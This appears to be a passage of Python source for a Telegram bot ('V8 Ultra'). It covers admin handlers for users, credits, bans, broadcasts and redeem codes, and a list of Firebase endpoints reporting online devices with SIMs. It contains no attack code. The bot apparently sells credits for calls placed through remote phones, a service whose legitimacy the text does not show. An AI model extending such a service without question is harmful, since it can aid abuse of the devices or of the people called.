    d = load(); users = list(d.get("users", {}).items())[:8]
    rows = [[btn(f"{u} · {ud.get('name','?')[:10]}", f"o:usr:{u}", EMOJI_STAR, "👤")] for u, ud in users]
    rows.append([btn("🔍 sᴇᴀʀᴄʜ", "o:usr_search", EMOJI_GEAR, "🔍", "primary")])
    rows.append([btn("ʙᴀᴄᴋ", "u:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, pq(f"👥 <b>Users ({len(d.get('users',{}))})</b>"), InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "o:usr_search")
async def o_usr_search(cq: CallbackQuery, state: FSMContext):
    await state.set_state(St.search); await safe_edit(cq.message, pq(f"🔍 <b>Search by UID or name:</b>"))

@R.message(St.search)
async def o_usr_search_done(msg: Message, state: FSMContext):
    q = msg.text.lower().strip(); d = load(); await state.clear()
    found = [(u, ud) for u, ud in d.get("users", {}).items() if q in u or q in ud.get("name", "").lower()][:8]
    if not found: return await msg.answer(pq("❌ Not found"))
    rows = [[btn(f"{u} · {ud.get('name','?')[:10]}", f"o:usr:{u}", EMOJI_STAR, "👤")] for u, ud in found]
    rows.append([btn("ʙᴀᴄᴋ", "u:home", EMOJI_GEAR, "🔙")])
    await msg.answer(pq(f"🔍 <b>{len(found)} results</b>"), InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("o:usr:"))
async def o_usr_detail(cq: CallbackQuery):
    uid = cq.data.split(":")[2]; d = load(); u = d["users"].get(uid, {})
    joined = datetime.fromtimestamp(u.get("joined_at", 0)).strftime('%d/%m/%Y') if u.get("joined_at") else "?"
    calls = len(d.get("call_history", {}).get(uid, []))
    banned = "🚫 BANNED" if int(uid) in d.get("banned", []) else "✅ active"
    txt = pq(f"👤 <b>User Detail</b>\n\n"
             f"🆔 <code>{uid}</code>\n"
             f"🏷 {esc(u.get('name','?'))}\n"
             f"{banned}\n"
             f"💰 credits: <b>{u.get('credits',0)}</b>\n"
             f"📞 calls made: <b>{calls}</b>\n"
             f"📅 joined: <b>{joined}</b>")
    await safe_edit(cq.message, txt, InlineKeyboardMarkup(inline_keyboard=[
        [btn("➕ ᴄʀᴇᴅɪᴛs", f"o:cr:{uid}", EMOJI_MONEY, "➕", "success"), btn("➖ ʀᴇᴍᴏᴠᴇ", f"o:cr_rm:{uid}", EMOJI_CROSS, "➖", "danger")],
        [btn("🚫 ʙᴀɴ" if int(uid) not in d.get("banned",[]) else "✅ ᴜɴʙᴀɴ", f"o:ban:{uid}", EMOJI_CROSS, "🚫", "danger")],
        [btn("ʙᴀᴄᴋ", "o:users", EMOJI_GEAR, "🔙")]]))

@R.callback_query(F.data.startswith("o:cr:"))
async def o_cr_direct(cq: CallbackQuery, state: FSMContext):
    uid = cq.data.split(":")[2]; await state.update_data(uid=uid, mode="add"); await state.set_state(St.cr_amt)
    await safe_edit(cq.message, pq(f"💰 <b>Add credits to</b> <code>{uid}</code>"))

@R.callback_query(F.data.startswith("o:cr_rm:"))
async def o_cr_rm(cq: CallbackQuery, state: FSMContext):
    uid = cq.data.split(":")[2]; await state.update_data(uid=uid, mode="remove"); await state.set_state(St.cr_amt)
    await safe_edit(cq.message, pq(f"💰 <b>Remove credits from</b> <code>{uid}</code>"))

@R.message(St.cr_amt)
async def o_cr_amt(msg: Message, state: FSMContext):
    try: amt = int(msg.text.strip())
    except: return
    d = await state.get_data(); db = load()
    if d.get("mode") == "add": add_cr(d["uid"], amt, db); log_admin(msg.from_user.id, "add_credits", f"{d['uid']} +{amt}")
    else: take_cr(d["uid"], amt, db); log_admin(msg.from_user.id, "remove_credits", f"{d['uid']} -{amt}")
    save(db); await state.clear()
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>{'Added' if d.get('mode')=='add' else 'Removed'} {amt}</b>"))

@R.callback_query(F.data.startswith("o:ban:"))
async def o_ban(cq: CallbackQuery):
    uid = int(cq.data.split(":")[2]); d = load()
    if uid in d["banned"]: d["banned"].remove(uid); await cq.answer("✅ Unbanned")
    else: d["banned"].append(uid); await cq.answer("🚫 Banned")
    log_admin(cq.from_user.id, "ban_toggle", f"{uid}"); save(d); await o_usr_detail(cq)

@R.callback_query(F.data == "o:fb")
async def o_fb(cq: CallbackQuery):
    d = load(); fbs = d.get("firebases", [])
    rows = [[btn("➕ ᴀᴅᴅ", "o:fb_add", EMOJI_CHECK, "➕", "success"), btn("📊 ʜᴇᴀʟᴛʜ", "o:fb_health", EMOJI_STAR, "📊", "primary")]]
    for i, fb in enumerate(fbs[:6]):
        online = sum(1 for dv in CACHED if dv["fb"] == fb["url"])
        rows.append([btn(f"{fb.get('label','FB')[:12]} ({online})", "noop", EMOJI_FIRE, "🔥"),
                     btn("🗑", f"o:fb_del:{i}", EMOJI_CROSS, "🗑", "danger")])
    rows.append([btn("ʙᴀᴄᴋ", "u:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, pq(f"🔥 <b>Firebases</b>\n\nTotal: <b>{len(fbs)}</b>\nOnline: <b>{len(CACHED)}</b>"), InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "o:fb_health")
async def o_fb_health(cq: CallbackQuery):
    txt = f"{em(EMOJI_STAR, '📊')} <b>Live Device Health</b>\n\n"
    if not CACHED: txt += "<i>No devices online</i>"
    for dv in CACHED[:10]:
        txt += f"🟢 <b>{esc(dv['name'][:16])}</b>\n   📶 {len(dv['sims'])} SIMs\n"
    await safe_edit(cq.message, pq(txt), kb([("🔄", "o:fb_health"), ("ʙᴀᴄᴋ", "o:fb")]))

@R.callback_query(F.data == "o:fb_add")
async def o_fb_add(cq: CallbackQuery, state: FSMContext): await state.set_state(St.fb_add); await safe_edit(cq.message, pq(f"🔥 <b>Format:</b> <code>Label | URL</code>"))
@R.message(St.fb_add)
async def o_fb_add_done(msg: Message, state: FSMContext):
    txt = msg.text.strip(); lb, url = ([p.strip() for p in txt.split("|",1)] if "|" in txt else (txt.replace("https://","").split(".")[0][:20], txt))
    if not url.startswith("http"): return await msg.answer("❌ http required")
    d = load(); d["firebases"].append({"url": url.rstrip("/"), "label": lb}); save(d); await state.clear()
    log_admin(msg.from_user.id, "fb_add", lb)
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Added {lb}</b>"))

@R.callback_query(F.data.startswith("o:fb_del:"))
async def o_fb_del(cq: CallbackQuery):
    d = load(); idx = int(cq.data.split(":")[2])
    label = d["firebases"][idx].get("label", "?")
    d["firebases"].pop(idx); save(d); log_admin(cq.from_user.id, "fb_del", label)
    await cq.answer("🗑 removed"); await o_fb(cq)

@R.callback_query(F.data == "o:cr")
async def o_cr(cq: CallbackQuery, state: FSMContext):
    await state.set_state(St.cr_uid); await safe_edit(cq.message, pq(f"💰 <b>Add Credits</b>\n\nUser ID:"))
@R.message(St.cr_uid)
async def o_cr_uid(msg: Message, state: FSMContext):
    await state.update_data(uid=msg.text.strip(), mode="add"); await state.set_state(St.cr_amt)
    await msg.answer(pq(f"💰 Amount?"))

@R.callback_query(F.data == "o:activity")
async def o_activity(cq: CallbackQuery):
    d = load(); lst = d.get("admin_activity", [])[-15:]
    if not lst: return await safe_edit(cq.message, pq("📜 <b>Admin Activity</b>\n\n<i>empty</i>"), kb([("ʙᴀᴄᴋ", "u:home")]))
    txt = "📜 <b>Admin Activity</b>\n\n"
    for a in reversed(lst):
        txt += f"<code>{a['u']}</code> · <b>{a['a']}</b> · {a.get('d','')[:30]}\n"
    await safe_edit(cq.message, pq(txt), kb([("🔄", "o:activity"), ("ʙᴀᴄᴋ", "u:home")]))

@R.callback_query(F.data == "o:bcast")
async def o_bcast(cq: CallbackQuery, state: FSMContext):
    await state.set_state(St.bcast); await safe_edit(cq.message, pq(f"📢 <b>Send broadcast message:</b>"))
@R.message(St.bcast)
async def o_bcast_done(msg: Message, state: FSMContext):
    d = load(); ok = 0
    for u in d.get("users", {}).keys():
        await _LIMITER.wait()
        try: await msg.bot.send_message(int(u), pq(f"{em(EMOJI_BELL, '📢')} <b>Announcement</b>\n\n{msg.html_text}"), parse_mode="HTML"); ok += 1
        except: pass
    await state.clear(); log_admin(msg.from_user.id, "broadcast", f"{ok} users")
    await msg.answer(pq(f"{em(EMOJI_CHECK, '✅')} <b>Delivered to {ok} users</b>"))

@R.callback_query(F.data == "o:redeem")
async def o_redeem(cq: CallbackQuery):
    d = load(); codes = d.get("redeem_codes", {})
    rows = [[btn("➕ ɢᴇɴᴇʀᴀᴛᴇ", "o:gen_code", EMOJI_CHECK, "➕", "success")]]
    for c, r in list(codes.items())[:5]:
        rows.append([btn(f"{c} ({r['uses']} left)", "noop", EMOJI_GIFT, "🎁"),
                     btn("🗑", f"o:code_del:{c}", EMOJI_CROSS, "🗑", "danger")])
    rows.append([btn("ʙᴀᴄᴋ", "u:home", EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, pq(f"🎁 <b>Redeem Codes</b> ({len(codes)})"), InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "o:gen_code")
async def o_gen(cq: CallbackQuery, state: FSMContext):
    await state.set_state(St.gen_code_amt); await safe_edit(cq.message, pq(f"🎁 <b>Credits per redemption:</b>"))

@R.message(St.gen_code_amt)
async def o_gen_amt(msg: Message, state: FSMContext):
    try: a = int(msg.text.strip())
    except: return
    await state.update_data(amt=a); await state.set_state(St.gen_code_uses)
    await msg.answer(pq(f"🎁 <b>Uses:</b>"))

@R.message(St.gen_code_uses)
async def o_gen_uses(msg: Message, state: FSMContext):
    try: u = int(msg.text.strip())
    except: return
    d = load(); data = await state.get_data(); await state.clear()
    code = "APEX" + "".join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=8))
    d.setdefault("redeem_codes", {})[code] = {"amount": data["amt"], "uses": u}
    save(d); log_admin(msg.from_user.id, "gen_code", f"{code} ({u} uses)")
    await msg.answer(pq(f"{em(EMOJI_GIFT, '🎁')} <b>Code:</b> <code>{code}</code>\n💰 {data['amt']} cr · {u} uses"))

@R.callback_query(F.data.startswith("o:code_del:"))
async def o_code_del(cq: CallbackQuery):
    code = cq.data.split(":")[2]; d = load()
    if code in d.get("redeem_codes", {}): del d["redeem_codes"][code]; save(d)
    await cq.answer("🗑"); await o_redeem(cq)

@R.callback_query(F.data == "o:free:on")
async def o_free_on(cq: CallbackQuery):
    d = load(); d["free_mode"] = True; save(d); await cq.answer("🟢 Free mode ON", show_alert=True); await nav_home(cq, None)

@R.callback_query(F.data == "o:free:off")
async def o_free_off(cq: CallbackQuery):
    d = load(); d["free_mode"] = False; save(d); await cq.answer("🔴 Free mode OFF", show_alert=True); await nav_home(cq, None)

# ═══════════════════════════════════════════════════════════════════════
# WEB & MAIN
# ═══════════════════════════════════════════════════════════════════════
async def web_server():
    async def handle(request): return web.Response(text="V8 Ultra Alive")
    app = web.Application(); app.router.add_get('/', handle)
    runner = web.AppRunner(app); await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    await web.TCPSite(runner, '0.0.0.0', port).start()

async def bg_scan(bot):
    global CACHED
    while True:
        try: CACHED = await scan(load())
        except: pass
        await asyncio.sleep(60)

async def main():
    if not BOT_TOKEN: return log.error("BOT_TOKEN missing")
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    asyncio.create_task(web_server())
    asyncio.create_task(bg_scan(bot))
    log.info(f"V8 Ultra online")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
